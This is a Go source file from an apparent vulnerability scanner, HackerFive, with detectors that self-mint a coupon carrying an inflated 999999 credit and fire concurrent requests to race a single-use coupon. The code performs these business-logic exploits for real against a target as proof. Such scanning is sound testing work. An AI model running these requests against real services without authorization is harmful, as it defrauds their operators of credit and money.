package businesslogic

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"

	"github.com/tuangatech/hacker-five/pkg/detectors"
)

// checkCouponSelfMintCredit mints a fresh coupon with an inflated amount,
// then applies it — a real response that reflects the injected amount as
// added credit is the finding. Deterministic: once the server confirms it
// added exactly the amount HackerFive itself chose, there's no ambiguity to
// triage, same "PoC required for high confidence" discipline every other
// detector's high-confidence findings already use.
func (d *Detector) checkCouponSelfMintCredit(ctx context.Context, target, host, authToken string) ([]detectors.Finding, error) {
	if authToken == "" {
		return nil, nil
	}
	code := "hf-blf-" + randomHex(8)
	mintBody := fmt.Sprintf(`{%q:%q,%q:%q}`, d.couponCodeField, code, d.couponAmountField, injectedCreditAmount)

	mintReq, mintResp, mintRespBody, err := d.doJSONRequest(ctx, http.MethodPost, target, host, d.couponMintPath, authToken, mintBody)
	if err != nil {
		return nil, nil // mint failed — nothing to apply, not a detector error
	}
	if mintResp.StatusCode != http.StatusOK {
		return nil, nil // target may not have this endpoint at all, or rejected it — no finding
	}

	applyBody := fmt.Sprintf(`{%q:%q,%q:%s}`, d.couponCodeField, code, d.couponAmountField, injectedCreditAmount)
	applyReq, applyResp, applyRespBody, err := d.doJSONRequest(ctx, http.MethodPost, target, host, d.couponApplyPath, authToken, applyBody)
	if err != nil {
		return nil, nil
	}
	if applyResp.StatusCode != http.StatusOK || !responseGrantedAmount(applyRespBody, injectedCreditAmount) {
		return nil, nil
	}

	return []detectors.Finding{{
		ID:          "businesslogic-coupon-self-mint-credit",
		Type:        "businesslogic",
		Severity:    "critical",
		Confidence:  "high",
		Target:      target + d.couponApplyPath,
		Description: fmt.Sprintf("self-minted coupon %q (amount %s, no admin/role check on %s) was accepted by %s and added real, unearned credit — the apply endpoint never cross-checks the client-supplied amount against the coupon's real stored value", code, injectedCreditAmount, d.couponMintPath, d.couponApplyPath),
		Evidence: map[string]string{
			"coupon_code":    code,
			"mint_request":   detectors.FormatRequest(mintReq.Method, mintReq.URL.String(), mintReq.Header, []byte(mintBody)),
			"mint_response":  detectors.FormatResponse(mintResp.StatusCode, mintResp.Header, mintRespBody),
			"apply_request":  detectors.FormatRequest(applyReq.Method, applyReq.URL.String(), applyReq.Header, []byte(applyBody)),
			"apply_response": detectors.FormatResponse(applyResp.StatusCode, applyResp.Header, applyRespBody),
		},
	}}, nil
}

// checkCouponApplyRace mints a second, independent coupon (kept separate
// from checkCouponSelfMintCredit's so the two checks stay order-independent),
// then fires raceConcurrency simultaneous apply requests for that one coupon
// via the last-byte-sync race client (raceclient.go). More than one
// successful apply for what should be a single-use coupon is a deterministic,
// count-based finding — no manual triage needed once the count is known.
func (d *Detector) checkCouponApplyRace(ctx context.Context, target, host, authToken string) ([]detectors.Finding, error) {
	if authToken == "" {
		return nil, nil
	}
	code := "hf-blf-race-" + randomHex(8)
	mintBody := fmt.Sprintf(`{%q:%q,%q:%q}`, d.couponCodeField, code, d.couponAmountField, injectedCreditAmount)

	_, mintResp, _, err := d.doJSONRequest(ctx, http.MethodPost, target, host, d.couponMintPath, authToken, mintBody)
	if err != nil || mintResp.StatusCode != http.StatusOK {
		return nil, nil
	}

	applyBody := []byte(fmt.Sprintf(`{%q:%q,%q:%s}`, d.couponCodeField, code, d.couponAmountField, injectedCreditAmount))
	results, err := fireRace(ctx, target, d.couponApplyPath, raceRequestOptions{
		Method: http.MethodPost,
		Headers: map[string]string{
			d.authHeaderName: strings.Replace(d.authHeaderFormat, "{token}", authToken, 1),
			"Content-Type":   "application/json",
		},
		Body:     applyBody,
		Insecure: d.insecure,
	}, d.raceConcurrency)
	if err != nil {
		return nil, nil // raw-conn race couldn't even fire — network/target issue, not a detector error
	}

	successes := 0
	var sample raceResponse
	for _, r := range results {
		if r.Err == nil && r.StatusCode == http.StatusOK {
			successes++
			sample = r
		}
	}
	if successes < 2 {
		return nil, nil
	}

	return []detectors.Finding{{
		ID:          "businesslogic-coupon-apply-race",
		Type:        "businesslogic",
		Severity:    "high",
		Confidence:  "high",
		Target:      target + d.couponApplyPath,
		Description: fmt.Sprintf("%d of %d simultaneous apply requests for the same single-use coupon %q succeeded (expected at most 1) — check-then-act race condition, no transaction/locking around the single-use enforcement", successes, d.raceConcurrency, code),
		Evidence: map[string]string{
			"coupon_code":        code,
			"concurrency":        strconv.Itoa(d.raceConcurrency),
			"successful_applies": strconv.Itoa(successes),
			"race_request_body":  string(applyBody),
			"sample_response":    detectors.FormatResponse(sample.StatusCode, sample.Header, sample.Body),
		},
	}}, nil
}

// maxGrantedAmountScanDepth bounds how deep responseGrantedAmount recurses
// into a nested JSON object/array — a real "wallet"/"balance" object nested
// a level or two under the top-level response (e.g.
// {"user":{"wallet":{"credit":...}}}) is common; unbounded recursion is not
// needed and would let a hostile/huge body do needless work.
const maxGrantedAmountScanDepth = 4

// responseGrantedAmount reports whether body's apply-coupon response
// contains any numeric JSON field whose value is close to injectedAmount —
// generalized (LT-135, docs/follow-up.md) from an earlier version hardcoded
// to crAPI's own "credit" field name, since a real target's success response
// can name this field anything (or nest it). Exact equality would miss the
// real shape (live-confirmed 2026-08-29 against crAPI: an account's real
// credit balance is its pre-existing balance *plus* the injected amount,
// e.g. "1000099.0" for a ~100 baseline + 999999 injected, never exactly
// "999999"), but a bare presence check would flag any successful apply at
// all, including a server that correctly ignores the client-supplied amount
// and grants its own small, legitimate value. A bounded range — [90%,
// 150%] of the injected amount — distinguishes "the server added roughly
// what was injected (plus a plausible small baseline)" from both "granted
// something else entirely" and an unrelated large number the response
// happens to also carry (a timestamp, a big object ID); injectedCreditAmount
// is deliberately huge (999999) specifically so this window rarely
// collides with an ordinary field's real range. Named, accepted limitation:
// this is a heuristic, not a guarantee — a target whose real baseline
// exceeds 50% of the injected amount, or whose response coincidentally
// carries an unrelated number in this exact window, could mislead it either
// way; revisit only if live testing shows it matters.
func responseGrantedAmount(body []byte, injectedAmount string) bool {
	injected, err := strconv.ParseFloat(injectedAmount, 64)
	if err != nil {
		return false
	}
	dec := json.NewDecoder(bytes.NewReader(body))
	dec.UseNumber()
	var parsed any
	if err := dec.Decode(&parsed); err != nil {
		return false
	}
	return anyNumericFieldInRange(parsed, injected*0.9, injected*1.5, 0)
}

// anyNumericFieldInRange recursively scans parsed (the output of a
// json.Decoder with UseNumber) for any numeric leaf value within [lo, hi],
// bounded to maxGrantedAmountScanDepth levels of object/array nesting.
func anyNumericFieldInRange(v any, lo, hi float64, depth int) bool {
	if depth > maxGrantedAmountScanDepth {
		return false
	}
	switch val := v.(type) {
	case json.Number:
		f, err := val.Float64()
		return err == nil && f >= lo && f <= hi
	case map[string]any:
		for _, child := range val {
			if anyNumericFieldInRange(child, lo, hi, depth+1) {
				return true
			}
		}
	case []any:
		for _, child := range val {
			if anyNumericFieldInRange(child, lo, hi, depth+1) {
				return true
			}
		}
	}
	return false
}

// doJSONRequest fires one JSON-body request and records the outcome against
// hostErrors. Mirrors authbypass.Detector.doRequestBody's shape.
func (d *Detector) doJSONRequest(ctx context.Context, method, target, host, path, token, body string) (*http.Request, *http.Response, []byte, error) {
	req, err := http.NewRequestWithContext(ctx, method, target+path, strings.NewReader(body))
	if err != nil {
		return nil, nil, nil, fmt.Errorf("businesslogic: building request: %w", err)
	}
	if token != "" {
		req.Header.Set(d.authHeaderName, strings.Replace(d.authHeaderFormat, "{token}", token, 1))
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := d.client.Do(req)
	if err != nil {
		d.hostErrors.RecordError(host)
		return nil, nil, nil, fmt.Errorf("businesslogic: fetching %s: %w", target+path, err)
	}
	defer func() { _ = resp.Body.Close() }()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		d.hostErrors.RecordError(host)
		return nil, nil, nil, fmt.Errorf("businesslogic: reading response body: %w", err)
	}
	d.hostErrors.RecordSuccess(host)
	return req, resp, respBody, nil
}

// randomHex returns n hex characters of crypto/rand-sourced randomness, used
// to build a coupon_code HackerFive itself controls end-to-end.
func randomHex(n int) string {
	b := make([]byte, (n+1)/2)
	_, _ = rand.Read(b)
	s := hex.EncodeToString(b)
	if len(s) > n {
		s = s[:n]
	}
	return s
}
